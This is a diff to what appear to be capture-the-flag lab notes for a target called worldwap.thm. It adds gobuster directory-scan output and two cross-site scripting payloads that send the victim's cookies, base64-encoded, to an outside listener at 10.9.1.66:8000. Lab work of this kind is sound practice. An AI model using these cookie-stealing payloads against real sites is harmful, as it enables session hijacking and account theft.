@@ -70,6 +70,34 @@ Nmap done: 1 IP address (1 host up) scanned in 10.78 seconds
 Progress: 882240 / 882244 (100.00%)
 
 
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://worldwap.thm:8081 -x php,txt,html 
+
+/.php                 (Status: 403) [Size: 279]
+/.html                (Status: 403) [Size: 279]
+/index.php            (Status: 200) [Size: 70]
+/login.php            (Status: 200) [Size: 3108]
+/profile.php          (Status: 302) [Size: 0] [--> login.php]
+/clear.php            (Status: 200) [Size: 4]
+/assets               (Status: 301) [Size: 320] [--> http://worldwap.thm:8081/assets/]
+/chat.php             (Status: 302) [Size: 0] [--> login.php]
+/db.php               (Status: 200) [Size: 0]
+/javascript           (Status: 301) [Size: 324] [--> http://worldwap.thm:8081/javascript/]
+/logout.php           (Status: 302) [Size: 0] [--> login.php]
+/setup.php            (Status: 200) [Size: 149]
+/block.php            (Status: 200) [Size: 15]
+/logs.txt             (Status: 200) [Size: 0]
+/phpmyadmin           (Status: 301) [Size: 324] [--> http://worldwap.thm:8081/phpmyadmin/]
+/.php                 (Status: 403) [Size: 279]
+/.html                (Status: 403) [Size: 279]
+/change_password.php  (Status: 302) [Size: 4] [--> login.php]
+/server-status        (Status: 403) [Size: 279]
+
+
+
+<script>fetch('http://10.9.1.66:8000/?cookie=' + btoa(document.cookie));</script>
+<script>var i=new Image(); i.src="https://10.9.1.66:8000/?cookie="+btoa(document.cookie);</script>        
 
   
 <\code>
